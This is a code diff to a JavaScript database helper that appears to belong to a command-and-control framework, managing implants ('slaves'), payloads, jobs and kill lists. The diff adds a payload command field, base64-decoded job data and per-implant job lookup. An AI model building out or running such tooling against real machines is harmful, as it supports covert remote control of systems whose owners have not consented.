@@ -21,6 +21,8 @@
  *      objectSize: $int,
  *      status: $string,
  *      variables: $array<$string>
+ *      data: $string/$raw
+ *      encoding: $string
  * }
  */
 
@@ -30,6 +32,7 @@
  *      id:   $string,
  *      description: $string,
  *      location: $string,
+ *      command: $string,
  *      osPayloads: $string
  *      categories: $array<$string>
  *      variables: $array<$string>
@@ -57,6 +60,7 @@ class DatabaseHelper {
             {
                 id: "af469d67-512a-4b59-b236-55102709f5e4",
                 name: 'Sleepy Hellow',
+                command: "sleep",
                 description: 'Sleeps for X seconds',
                 location: "./payloads/af469d67-512a-4b59-b236-55102709f5e4/",
                 variables: [
@@ -69,7 +73,6 @@ class DatabaseHelper {
                 categories: [ 'scary', 'stealth' ],
                 osPayloads: [ 'linux' ]
               }
-              
         )
     }
 
@@ -127,6 +130,28 @@ class DatabaseHelper {
         });
     }
 
+    setJobData(id, data, encoding) {
+
+        this.jobs = this.jobs.map(job => {
+
+            // Change the data of the job with id.
+            if (job.id == id) {
+
+                job.encoding = encoding
+                if (job.encoding === "base64") {
+                    job.data = Buffer.from(data, 'base64').toString();
+                }
+                else {
+                    job.data = data;
+                }
+                
+                return job;
+            }
+
+            return job; // Leave the other jobs be.
+        });
+    }
+
     setNickname(slaveId, name) {
 
         this.slaves = this.slaves.map(slave => {
@@ -143,6 +168,7 @@ class DatabaseHelper {
             id: payload.id,
             osPayloads: payload.osPayloads,
             name: payload.name,
+            command: payload.command,
             variables: payload.variables,
             location: payload.location,
             createdAt: new Date(Date.now()).toUTCString(),
@@ -222,6 +248,11 @@ class DatabaseHelper {
         })
 
         return newJobList;
+    }
+
+    getJobsForImplant(id) {
+
+        return this.jobs.filter((list) => list.slaveId == id)
     }
 
     getKillList(slaveId) {
